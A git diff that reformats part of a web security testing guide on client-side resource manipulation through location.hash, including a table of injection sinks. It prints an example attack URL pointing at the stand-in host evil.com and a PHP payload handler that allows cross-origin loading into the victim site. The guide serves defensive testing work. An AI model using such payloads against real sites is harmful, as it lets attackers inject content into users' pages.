@@ -59,11 +59,9 @@ The `location.hash` is controlled by user input and is used for requesting an ex
 
 `www.victim.com/\#http://evil.com/html.html`
 
-With the payload handler:
+With the payload handler for `html.html`:
 
 ```html
-http://evil.com/html.html
-----
 <?php
 header('Access-Control-Allow-Origin: http://www.victim.com');
 ?>
@@ -85,7 +83,7 @@ The following table shows possible injection points (sink) that should be checke
 | --------------- | ----------------------------------------- | ------ |
 | Frame           | iframe                                    | src    |
 | Link            | a                                         | href   |
-| AJAX Request    | `xhr.open(method, <i>\[url\]</i>, true);` | URL    |
+| AJAX Request    | `xhr.open(method, [url], true);` | URL    |
 | CSS             | link                                      | href   |
 | Image           | img                                       | src    |
 | Object          | object                                    | data   |
